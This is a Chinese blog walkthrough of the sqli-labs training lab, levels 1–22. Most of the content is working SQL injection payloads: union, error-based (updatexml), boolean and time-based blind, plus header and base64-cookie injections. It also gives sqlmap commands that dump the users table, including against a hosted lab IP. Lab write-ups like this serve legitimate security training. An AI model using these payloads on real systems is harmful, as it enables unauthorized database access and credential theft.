﻿---
title: sqli-labs(1~22)
date: 2019-03-07
---
[sqli-labs网址链接](http://43.247.91.228:84)
## less-1
**方法一：**
输入?id=1正常显示，输入?id=1'报错，输入?id=1' and 1='1，正常显示，得知是字符型注入，
爆字段： `?id=1' order by 3--+` 
查看回显内容：`?id=-1‘ union select 1,2,3--+`
爆库名，版本号：`？id=-1' union select 1,database(),version()`
爆所有数据库：`?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata%23`
爆表名：`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'%23`
爆列名：`?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'%23`
爆数据：`?id=-1' union select 1,2,group_concat(id,username,password) from users%23`

**方法二：**
借助sqlmap软件直接爆破
最终payload：`./sqlmap.py -u "http://43.247.91.228:84/Less-1/?id=1"  -D security -T users --dump`
得到的数据结果如下：
![获取数据](https://s2.ax1x.com/2019/02/27/kTWpG9.png)
## less-2
输入1'，根据报错信息确定输入的内容被原封不动的带入到数据库中，输入?id=1 and 1=1,显示正常，得知是数字型注入，将单引号去掉，其他方法步骤和less-1一样，不再重复了。
直接上爆数据payload：`?id=-1 union select 1,2,group_concat(id,username,password) from users%23`
sqlmap同样可以直接爆破，payload后的参数和less-1一样。
## less-3
单引号报错，输入1'，根据报错信息发现输入的内容后有')，想到应该以 ') 来闭合表达式，脑补一下输入1后的sql语言，形如select ... from ... where id=('1') ...，在第一题中id=1的后面加上'）,其他步骤和方法和less-1一样，不再重复了。
直接上爆数据payload：`?id=-1') union select 1,2,group_concat(id,username,password) from users%23`
sqlmap同样可以直接爆破，payload后的参数和less-1一样。

## less-4
双引号报错，输入1'，显示正常，输入1'',根据报错信息发现输入的内容后有")，想到应该以 '') 来闭合表达式，脑补一下输入1后的sql语言，形如select ... from ... where id=(''1'’) ...，在第一题中id=1的后面加上''）,其他步骤和方法和less-1一样，不再重复了。
直接上爆数据payload：`?id=-1") union select 1,2,group_concat(id,username,password) from users%23`
sqlmap同样可以直接爆破，payload后的参数和less-1一样。

## less-5
输入之前的内容发现不再显示数据信息，应该是报错注入或者盲注。
输入?id=1'报错，根据sql语法错误提示，得知是字符型报错注入。
爆库名：`?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23`
爆表名：`?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)%23`
爆列名：`?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1)%23`
爆数据：`?id=1' and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)%23`
sqlmap同样可以直接爆破，payload后的参数和less-1一样。

## less-6
与第5关类似，只不过这一关使用的是" "的方式闭合字符串，我们只需要将?id=1' 改为 ?id=1",后面的参数不变，其余过程不再赘述，和less-5一样。
sqlmap同样可以直接爆破，payload后的参数和less-1一样。

## less-7
输入`?id=1'`报错，经几次测试后发现只有在后面添加 ' 会报错，但是这次后台对报错进行了处理，所有错误都显示语法错误。
我们利用单引号进行进一步注入：`?id=1' and sleep(3)--+`还是报错，猜测是不是过滤了某些字符，
测试过滤字符：`?id=1' and sleep(3) or 1='1`发现显示正常了，发现后台过滤了的注释字符,通过盲注一步步判断
判断数据库的第一个字符是s：`?id=1' and ascii(substr((select database()),1,1))=115 and 1='1`
显示正常，说明数据库的第一个字符的acsll值为115，即为s。
一步步尝试，过程比较麻烦，使用脚本比较方便。
可直接sqlmap跑一下，payload后的参数和less-1一样。

## less-8
这一个和less-7差不多，把报错全部过滤了，如果错误就没有返回，正确就返回you are in……，而其注释符没有被过滤，我们就可以利用基于布尔的盲注进行测试：
判断数据库的第一个字符是s：`?id=1' and ascii(substr((select database()),1,1))=115--+`
一步步尝试，过程比较麻烦，使用脚本比较方便。
可直接sqlmap跑一下，payload后的参数和less-1一样。

## less-9
无论输入什么都是返回相同的内容，报错注入无效了，尝试一下时间盲注：
判断是否有注入：`?id=1' and sleep(3)--+`，停留了3s后刷新，说明存在注入点。
其他的和less-7差不多，只是在最后要加上`and sleep(3)--+`来判断对错。
判断数据库的第一个字符是s：`?id=1' and ascii(substr((select database()),1,1))=115 and sleep(3)--+`
一步步尝试，过程比较麻烦，使用脚本比较方便。
可直接sqlmap跑一下，payload后的参数和less-1一样。

## less-10
和less-9类似，只是闭合符号变成了 '' ，
检查是否存在注入：`?id=1'' and sleep(3)--+`,停留了3s后刷新，说明存在注入点。其他的和less-9一样了，
判断数据库的第一个字符是s：`?id=1'' and ascii(substr((select database()),1,1))=115 and sleep(3)--+`
一步步尝试，过程比较麻烦，使用脚本比较方便。
可直接sqlmap跑一下，payload后的参数和less-1一样。

## less-11
**方法一：**
页面显示变了，不再是get方式传递参数，改为post方式传参，通过尝试发现闭合方式为 ' ,先使用万能钥匙登陆，登陆成功。
![万能密码登陆](https://s2.ax1x.com/2019/03/05/kjlLIx.png)
查看是否有注入点，爆字段试试，
![爆字段](https://s2.ax1x.com/2019/03/05/kj1ItP.png)
开始尝试`order by 3#`提示错误，最终确定`order by 2#`正常，接着判断回显内容，并爆数据库，
![爆数据库](https://s2.ax1x.com/2019/03/05/kj3etx.png)
爆表名，
![爆表名](https://s2.ax1x.com/2019/03/05/kj3zbd.png)
爆列名，
![爆列名](https://s2.ax1x.com/2019/03/05/kjG3FI.png)
爆数据，
![爆数据](https://s2.ax1x.com/2019/03/05/kjGwwj.png)
**方法二：**
还可以借助sqlmap软件直接爆破
最终payload：`./sqlmap.py -u "http://localhost/sqli-labs/Less-11/" --data="uname=*&passwd=*" -D security -T users --dump`

## less-12
根据题目提示闭合方式应该为 ") ，输入万能钥匙，果然登陆成功，
![万能钥匙登陆](https://s2.ax1x.com/2019/03/06/kvJIw4.png)
其他的和less-11一样，只是闭合方式变成了")，其他的就不赘述了。下面直接上爆数据的截图，
![爆数据](https://s2.ax1x.com/2019/03/06/kvYMhn.png)
也可直接sqlmap跑一下，payload后的参数和less-11一样。

## less-13
根据提示闭合方式应该是 ') ，但是利用万能钥匙成功登陆后并不显示有用信息，尝试报错注入，竟然成功了。
![爆数据库](https://s2.ax1x.com/2019/03/06/kvdEdO.png)
接着爆表名：
![爆表名](https://s2.ax1x.com/2019/03/06/kvdQyt.png)
接着爆列名：
![爆表名](https://s2.ax1x.com/2019/03/06/kvdlOP.png)
最后爆数据：
![爆数据](https://s2.ax1x.com/2019/03/06/kvdDmV.png)
也可直接sqlmap跑一下，payload后的参数和less-11一样。

## less-14
通过尝试发现闭合方式为 " ，其他方法和less-13一样，不再赘述，下面直接上爆数据的截图，
![爆数据](https://s2.ax1x.com/2019/03/06/kvwMh4.png)
也可直接sqlmap跑一下，payload后的参数和less-11一样。

## less-15
根据提示闭合方式为 ' ，但无论输入什么，都不再输出任何信息，只能尝试盲注，判断库名的第一个字符是否为s:
![判断库名的第一个字符是s](https://s2.ax1x.com/2019/03/06/kvBFLq.png)
返回登陆成功，说明库名的第一个字符为s，反之则返回登陆失败。
接着要一步步尝试，过程比较麻烦，使用脚本比较方便。

## less-16
通过尝试发现闭合方式为 ")，其他和less-15一样，只不过改变了闭合方式，直接上判断库名第一个字符是否为s的截图
![判断库名的第一个字符为s](https://s2.ax1x.com/2019/03/06/kvBlO1.png)
返回登陆成功，说明说明库名的第一个字符为s，反之则返回登陆失败。接着要一步步尝试，过程比较麻烦，使用脚本比较方便。

## less-17
利用万能钥匙登陆，竟然被嘲讽了。发现页面显示重置密码，sql语句应该类似于`update table set password='xxx' where username = 'xxx'`,需要我们先知道一个username，前几关爆数据的时候username里都有Dumb,我们输入username为Dumb，密码为123456后提示密码更改成功，然后进一步尝试，利用用户名为Dumb在密码处进行注入，
在密码栏里写入：`1' order by 3#` ，报错了。试一下报错注入，
在密码栏里输入：`1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#`，成果爆出库名，
爆表名：密码栏输入`-1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)#`,
爆列名：`-1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'),0x7e),1)#`。

sqlmap也可以跑出来数据库和表，参数的payload：`--data="uname=admin&passwd=*" -D security -T tables --dump`。

## less-18
根据提示应该是UA注入，查看源代码，发现输入内容都有审查函数，不存在注入，先试一下UA注入。
根据前几关知道有一组数据为admin-admin，所以在username和password处都输入admin，成功登陆，看到提示信息，然后bp抓包后把User-Agent后的内容改为 1' 运行，报错，说明存在注入，而且源代码里发现很重要的一条语句 **INSERT INTO table_name ('uagent','ip_address','username') VALUES ('\$uagent','\$IP','$uname')**，需要构造注入语句，还要满足闭合条件,
爆库名：`' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1='1` 
![修改User-Agent](https://s2.ax1x.com/2019/03/07/kxQFB9.png)
成功得到库名，其他步骤都类似了，不再赘述。

## less-19
与less-18类似，根据提示是Referer注入，成功登陆后bp抓包，修改Referer内容。
爆库名：`' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1='1` 
![修改Referer](https://s2.ax1x.com/2019/03/07/kxQg3T.png)
成功得到库名，其他步骤都类似了，不再赘述。

## less-20
与less-19类似，根据提示是Cookie注入，成功登陆后bp抓包，修改Cookie内容。
爆库名：` uname=' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1='1`
![修改Cookie](https://s2.ax1x.com/2019/03/07/kxNiuV.png)
成功得到库名，其他步骤都类似了，不再赘述。

## less-21
按less-20的方法成功登陆后，发现页面和less-20有一些不同，
![base64编码](https://s2.ax1x.com/2019/03/07/kxN4bT.png)
uname后的数据加密了，看到加密末尾的 = ，猜测应该是base64编码，到网上将admin进行base64加密，加密结果果然一样。
需要把注入字段进行base64加密，其他方法和less-20一样。
爆库注入字段：` uname=' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1='1`
注入字段base64编码：`uname=JyBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIG9yIDE9JzE=`
成功登陆后修改Cookie内容，
![修改Cookie，并进行base64编码](https://s2.ax1x.com/2019/03/07/kxNq2R.png)
成功得到库名，其他步骤都类似了，不再赘述。

## less-22
和less-21类似，根据题目提示闭合方式是 " ，其他方法和less-21一样。
爆库注入字段：` uname=" or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1="1`
注入字段base64编码：`uname=IiBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIG9yIDE9IjE=`
成功登陆后修改Cookie内容，
![修改Cookie并进行base64编码](https://s2.ax1x.com/2019/03/07/kxUHw8.png)
成功得到库名，其他步骤都类似了，不再赘述。

***sqli-labs(1~22)关卡全部完成了，如有错误，欢迎在评论中指出!***
